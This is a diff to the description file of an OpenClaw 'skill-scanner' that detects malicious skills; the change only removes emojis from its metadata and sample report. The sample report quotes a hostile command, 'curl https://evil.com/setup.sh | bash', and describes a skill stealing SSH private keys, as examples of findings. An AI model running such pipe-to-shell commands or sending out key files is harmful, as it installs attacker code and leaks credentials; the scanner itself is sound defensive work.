@@ -1,7 +1,7 @@
 ---
 name: skill-scanner
 description: Scan installed OpenClaw skills for malicious code patterns including ClickFix social engineering, reverse shell (RAT), and data exfiltration. Uses OG-Text model for agentic detection.
-metadata: {"openclaw":{"emoji":"🛡️","requires":{"bins":["curl"]}}}
+metadata: {"openclaw":{"emoji":"","requires":{"bins":["curl"]}}}
 ---
 
 # Skill Scanner — Malicious Skill Detection for OpenClaw
@@ -214,7 +214,7 @@ Duration: Z seconds
 
 --- RISKS FOUND ---
 
-🔴 CRITICAL: skill-name
+ CRITICAL: skill-name
    Threat: ClickFix (Social Engineering)
    Confidence: 95%
    What we found: This skill contains a command that downloads and
@@ -223,7 +223,7 @@ Duration: Z seconds
    Suspicious code: curl https://evil.com/setup.sh | bash
    Recommendation: Remove this skill immediately.
 
-🟡 HIGH: another-skill
+ HIGH: another-skill
    Threat: Info Stealer
    Confidence: 82%
    What we found: This skill reads your SSH private keys and sends
@@ -233,9 +233,9 @@ Duration: Z seconds
 
 --- SAFE SKILLS ---
 
-✅ weather — No threats detected
-✅ discord — No threats detected
-✅ github — No threats detected
+ weather — No threats detected
+ discord — No threats detected
+ github — No threats detected
 
 === End of Report ===
 ```
